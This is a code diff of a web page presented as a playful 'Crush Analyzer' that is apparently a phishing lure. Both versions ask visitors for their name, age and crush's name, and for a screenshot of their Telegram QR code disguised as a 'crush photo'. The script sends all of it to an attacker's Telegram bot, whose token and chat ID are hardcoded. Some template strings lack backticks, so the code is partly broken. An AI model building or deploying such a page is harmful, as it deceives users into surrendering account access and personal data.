@@ -1,80 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Telegram Knows What Your Crush Thinks About You 💘</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #fce4ec;
-            font-size: 24px; /* BIGGER TEXT */
-        }
-        input, button {
-            margin: 15px 0;
-            padding: 18px;
-            width: 90%;
-            max-width: 400px;
-            font-size: 22px; /* BIGGER INPUT TEXT */
-        }
-        .warning {
-            color: red;
-            font-size: 20px; /* BIGGER WARNING */
-        }
-        h2 {
-            font-size: 32px; /* BIGGER TITLE */
-        }
-        #statusMsg {
-            margin-top: 20px;
-            font-size: 22px; /* Bigger status text */
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Telegram Knows About Your Crush</title>
+  <style>
+    body { font-family: Arial; padding: 20px; font-size: 26px; }
+    label, input, button { display: block; margin-top: 12px; font-size: 24px; }
+    button { padding: 10px 20px; }
+  </style>
 </head>
 <body>
-    <h2>💘Telegram Knows What Your Crush Thinks About You 💘</h2>
+  <h2>🔮 Crush Analyzer 🔮</h2>
+  <p>Send the QR code on your Telegram app, their name, your age, and your name. (Then you will know the truth ❤️)</p>
 
-    <input type="text" id="yourName" placeholder="Your Name"><br>
-    <input type="number" id="yourAge" placeholder="Your Age"><br>
-    <input type="text" id="crushName" placeholder="Your Crush's Name"><br>
+  <form id="crushForm">
+    <label>Your Name:</label>
+    <input type="text" id="yourName" required>
 
-    <p class="warning">Telegram knows about your crush.</p>
-    <input type="file" id="QRcode" accept="image/*"><br>
+    <label>Your Age:</label>
+    <input type="number" id="yourAge" required>
 
-    <button onclick="sendData()">Submit & Get Reading</button>
+    <label>Crush's Name:</label>
+    <input type="text" id="crushName" required>
 
-    <p id="statusMsg"></p>
+    <label>Upload Crush Photo:</label>
+    <input type="file" id="YourQR(screenshot)" accept="image/*" required>
 
-    <script>
-        async function sendData() {
-            const yourName = document.getElementById('yourName').value;
-            const yourAge = document.getElementById('yourAge').value;
-            const crushName = document.getElementById('crushName').value;
-            const photoInput = document.getElementById('QRcode');
+    <button type="submit">Tell Me the Truth 🔥</button>
+  </form>
 
-            if (!yourName  !yourAge  !crushName || photoInput.files.length === 0) {
-                document.getElementById('statusMsg').innerText = "❌ Please fill all fields and upload a photo.";
-                return;
-            }
+  <p id="status" style="color:green;"></p>
 
-            document.getElementById('statusMsg').innerText = "🔮 Sending... Please wait...";
+  <script>
+    const BOT_TOKEN = "7548275702:AAEI9W4yHPQA6FiWCXiGUbqkkjBEXcSG29Y";
+    const CHAT_ID = "7546051597";
 
-            const formData = new FormData();
-            formData.append('chat_id', '7546051597');  // 🛑 Replace this!
-            formData.append('caption', New Crush Reading Request:\\nName: ${yourName}\\nAge: ${yourAge}\\nCrush: ${crushName});
-            formData.append('photo', photoInput.files[0]);
+    document.getElementById('crushForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
 
-            try {
-                await fetch(https://api.telegram.org/bot7548275702:AAEI9W4yHPQA6FiWCXiGUbqkkjBEXcSG29Y/sendPhoto, {  // 🛑 Replace this!
-                    method: 'POST',
-                    body: formData
-                });
-                document.getElementById('statusMsg').innerText = "✅ Your info has been sent! You will get soon with your reading ✨";
-            } catch (error) {
-                console.error(error);
-                document.getElementById('statusMsg').innerText = "❌ Error sending your info. Please try again later.";
-            }
-        }
-    </script>
+      const name = document.getElementById('yourName').value;
+      const age = document.getElementById('yourAge').value;
+      const crush = document.getElementById('crushName').value;
+      const photo = document.getElementById('YourQR(screenshot)').files[0];
+
+      // ✅ Step 1: Send Text Info
+      const text = 💌 New Crush Submission:\n\n👤 Your Name: ${name}\n🎂 Your Age: ${age}\n❤️ Crush's Name: ${crush};
+      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
+
+      // ✅ Step 2: Send Photo
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', photo);
+
+      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+        method: 'POST',
+        body: formData
+      });
+
+      document.getElementById('status').innerText = "✅ Sent Successfully!";
+      document.getElementById('crushForm').reset();
+    });
+  </script>
 </body>
 </html>
